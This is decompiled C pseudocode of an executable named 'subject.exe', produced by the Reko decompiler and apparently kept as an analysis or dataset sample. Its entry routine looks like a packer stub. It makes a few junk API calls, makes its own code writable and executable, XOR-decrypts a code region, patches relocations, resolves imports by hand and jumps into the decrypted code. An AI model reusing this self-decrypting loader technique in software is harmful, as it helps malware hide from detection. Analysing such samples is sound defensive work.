// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: Register Eq_2 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	ptr32 esp_23;
	byte SCZO_24;
	word32 esi_26;
	byte SZO_28;
	byte C_29;
	word32 edx_30;
	Eq_2 eax_31;
	byte Z_32;
	word32 ecx_33;
	byte dl_34;
	word32 ebp_35;
	byte CZ_36;
	byte S_37;
	Eq_16 ebx_25;
	Eq_16 edi_101;
	SHLWAPI.dll!StrStrIA();
	if (eax_31 != 0x00)
		return eax_31;
	*(esp_23 - 0x04) = (uint32) eax_31;
	*(esp_23 - 0x08) = (uint32) eax_31;
	Eq_2 eax_54 = AddUsersToEncryptedFile(*(esp_23 - 0x08), *(esp_23 - 0x04));
	if (eax_54 == 0x00)
		return eax_54;
	*(esp_23 - 0x0C) = ~0x00;
	*(esp_23 - 0x10) = ~0x00;
	Eq_60 eax_62 = AreAllAccessesGranted(*(esp_23 - 0x10), *(esp_23 - 0x0C));
	if (eax_62 == 0x00)
		ebx_25 = eax_62 + 0x2E;
	*(esp_23 - 0x14) = esp_23;
	*(esp_23 - 0x18) = 0x40;
	*(esp_23 - 0x1C) = 0x3000;
	*(esp_23 - 0x20) = 0x00401000;
	VirtualProtect(*(esp_23 - 0x20), *(esp_23 - 0x1C), *(esp_23 - 0x18), *(esp_23 - 0x14));
	*(esp_23 - 0x14) = *(esp_23 - 0x14) - 0x01;
	struct Eq_138 * ecx_100 = null;
	do
	{
		if (edi_101 == ebx_25)
			edi_101 = null;
		ecx_100[4199896] = (struct Eq_138) (edi_101[0x00404000] ^ ecx_100[4199896] ^ 0xA0);
		ecx_100 = ecx_100 + 0x01;
		edi_101 = (Eq_16) (edi_101 + 0x01);
	} while (ecx_100 < (struct Eq_138 *) 0x1440);
	*(esp_23 - 0x24) = ebp_35;
	*(esp_23 - 0x14) = *(esp_23 - 0x14) + 0x01;
	*(esp_23 - 0x04) = 0x00401358;
	*(esp_23 - 0x0C) = 0x00;
	struct Eq_191 * esp_104 = esp_23 - 0x24;
	struct Eq_193 * edx_108 = &globals->t4028D8;
	int32 edi_112 = 0x00401358;
	up32 ebp_113 = 0x00;
	if (*(esp_23 - 0x14) > 0x00)
	{
		do
		{
			Eq_216 eax_244 = edx_108->t0004 - 0x08 >> 0x01;
			word16 * ecx_247 = (char *) &edx_108->t0004 + 0x04;
			if (eax_244 > 0x00)
			{
				Eq_216 ebx_260 = eax_244;
				do
				{
					ui32 eax_263 = (word32) *ecx_247;
					if ((eax_263 & 0xF000) == 0x3000)
					{
						struct Eq_255 * eax_275 = (eax_263 & 0x0FFF) + edx_108->dw0000;
						eax_275->dw401358 = eax_275->dw401358 + 0xF0401358;
					}
					ecx_247 = ecx_247 + 0x01;
					ebx_260 = ebx_260 - 0x01;
				} while (ebx_260 != 0x00);
				ebp_113 = *(esp_23 - 0x0C);
			}
			ebp_113 = (word32) edx_108->t0004 + ebp_113;
			*(esp_23 - 0x0C) = ebp_113;
			edx_108 = edx_108 + Mem254[edx_108 + 0x04:word32];
		} while (ebp_113 < *(esp_23 - 0x14));
	}
	*(esp_23 - 0x0C) = 0x004020C4;
	if (globals->dw4020D4 != 0x00)
	{
		struct Eq_300 * ebx_149 = &globals->t4020C4;
		edi_153 = edi_112;
		esp_157 = esp_104;
		do
		{
			int32 edi_153;
			struct Eq_191 * esp_157;
			esp_157 = esp_157 - 0x04;
			esp_157->dw0000 = ebx_149->dw000C + edi_153;
			Eq_360 eax_162 = LoadLibraryA(esp_157->dw0000);
			esp_157->dw001C = (word32) eax_162;
			Eq_360 ecx_163 = eax_162;
			if (eax_162 != null)
			{
				ptr32 ebp_184 = ebx_149->dw0000;
				if (ebp_184 == 0x00)
					ebp_184 = ebx_149->dw0010;
				Eq_320 eax_190 = ebp_184 + edi_153;
				struct Eq_323 * ebp_191 = ebp_184 + edi_153;
				word32 * esi_192 = ebx_149->dw0010 + edi_153;
				if (eax_190 != 0x00)
				{
					while (true)
					{
						Eq_348 eax_208;
						if (eax_190 < 0x00)
						{
							struct Eq_400 * esp_223 = esp_157 - 0x04;
							esp_223->t0000 = (word32) ebp_191->w0000;
							*(esp_223 - 0x04) = (HMODULE *) ecx_163;
							eax_208 = GetProcAddress(*(esp_223 - 0x04), esp_223->t0000);
							edi_153 = esp_223->dw001C;
						}
						else
						{
							LPCSTR * esp_230 = esp_157 - 0x04;
							*esp_230 = (LPCSTR *) ((word32) eax_190 + 0x02 + edi_153);
							*(esp_230 - 0x04) = (HMODULE *) ecx_163;
							eax_208 = GetProcAddress(*(esp_230 - 0x04), *esp_230);
						}
						*esi_192 = (word32) eax_208;
						ebp_191 = ebp_191 + 0x01;
						esp_157 = esp_157 - 0x08;
						eax_190.u1 = ebp_191->w0000;
						esi_192 = esi_192 + 0x01;
						if (eax_190 == 0x00)
							break;
						ecx_163 = (Eq_360) esp_157->dw001C;
					}
					ebx_149 = (struct Eq_300 *) esp_157[0x03];
				}
			}
			ebx_149 = ebx_149 + 0x01;
			esp_157[0x03] = (struct Eq_191) ebx_149;
		} while (ebx_149->dw0010 != 0x00);
	}
	ptr32 esp_132;
	byte SCZO_133;
	word32 ebx_134;
	word32 esi_135;
	word32 edi_136;
	byte SZO_137;
	byte C_138;
	word32 edx_139;
	word32 eax_140;
	byte Z_141;
	word32 ecx_142;
	byte dl_143;
	word32 ebp_144;
	byte CZ_145;
	byte S_146;
	globals->t401DB8();
	*(esp_132 - 0x04) = 0x00;
	ExitProcess(*(esp_132 - 0x04));
}

